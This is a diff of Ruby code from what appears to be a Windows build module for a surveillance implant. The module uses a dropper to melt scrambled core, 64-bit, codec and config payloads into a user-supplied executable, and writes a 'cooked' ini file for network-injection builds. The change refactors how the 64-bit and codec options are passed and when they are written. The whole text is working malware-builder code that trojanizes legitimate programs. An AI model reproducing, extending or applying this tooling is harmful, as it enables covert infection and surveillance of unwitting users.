@@ -159,8 +159,8 @@ class BuildWindows < Build
     executable = path('default')
 
     # by default build the 64bit support
-    bit64 = (params['bit64'] == false) ? false : true
-    codec = (params['codec'] == false) ? false : true
+    @bit64 = (params['bit64'] == false) ? false : true
+    @codec = (params['codec'] == false) ? false : true
 
     # use the user-provided file to melt with
     if params['input']
@@ -168,16 +168,16 @@ class BuildWindows < Build
       executable = path('input')
 
       CrossPlatform.exec path('dropper'), path(@scrambled[:core])+' '+
-                                          (bit64 ? path(@scrambled[:core64]) : 'null') +' '+
+                                          (@bit64 ? path(@scrambled[:core64]) : 'null') +' '+
                                           path(@scrambled[:config])+' '+
 
                                           # TODO: driver removal
                                           'null ' +
                                           'null ' +
                                           #path(@scrambled[:driver])+' '+
-                                          #(bit64 ? path(@scrambled[:driver64]) : 'null') +' '+
+                                          #(@bit64 ? path(@scrambled[:driver64]) : 'null') +' '+
 
-                                          (codec ? path(@scrambled[:codec]) : 'null') +' '+
+                                          (@codec ? path(@scrambled[:codec]) : 'null') +' '+
                                           @scrambled[:dir]+' '+
                                           manifest +' '+
                                           @funcname +' '+
@@ -198,7 +198,7 @@ class BuildWindows < Build
     # this is a build for the NI
     if params['cooked'] == true
       @cooked = true
-      cook(params['admin'])
+      cook(params)
     end
 
     File.exist? path('output') || raise("output file not created")
@@ -271,7 +271,7 @@ class BuildWindows < Build
 
   private
 
-  def cook(admin)
+  def cook(params)
     key = Digest::MD5.digest(@factory.logkey).unpack('H2').first.upcase
 
     # write the ini file
@@ -280,8 +280,8 @@ class BuildWindows < Build
       f.puts "HUID=#{@factory.ident}"
       f.puts "HCORE=#{@scrambled[:core]}"
       f.puts "HCONF=#{@scrambled[:config]}"
-      f.puts "CODEC=#{@scrambled[:codec]}"
-      f.puts "DLL64=#{@scrambled[:core64]}"
+      f.puts "CODEC=#{@scrambled[:codec]}" if @codec
+      f.puts "DLL64=#{@scrambled[:core64]}" if @bit64
 
       # TODO: driver removal (just comment them here)
       #f.puts "HDRV=#{@scrambled[:driver]}"
@@ -291,7 +291,7 @@ class BuildWindows < Build
       f.puts "HREG=#{@scrambled[:reg]}"
       f.puts "HSYS=ndisk.sys"
       f.puts "HKEY=#{key}"
-      f.puts "MANIFEST=" + (admin == true ? 'yes' : 'no')
+      f.puts "MANIFEST=" + (params['admin'] == true ? 'yes' : 'no')
       f.puts "FUNC=" + @funcname
     end
 
